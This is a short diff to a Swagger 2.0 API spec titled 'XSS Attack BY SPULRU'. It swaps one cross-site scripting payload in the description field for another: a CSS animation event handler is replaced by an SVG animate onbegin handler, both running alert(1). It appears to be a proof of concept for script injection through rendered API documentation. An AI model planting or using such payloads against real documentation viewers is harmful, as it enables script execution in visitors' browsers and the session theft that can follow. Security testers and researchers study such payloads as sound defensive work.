@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY SPULRU
   description: |
-    </p><style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss><p>
+    </p><svg><animate onbegin=alert(1) attributeName=x dur=1s><p>
     
   version: production
 basePath: /JSSResource/
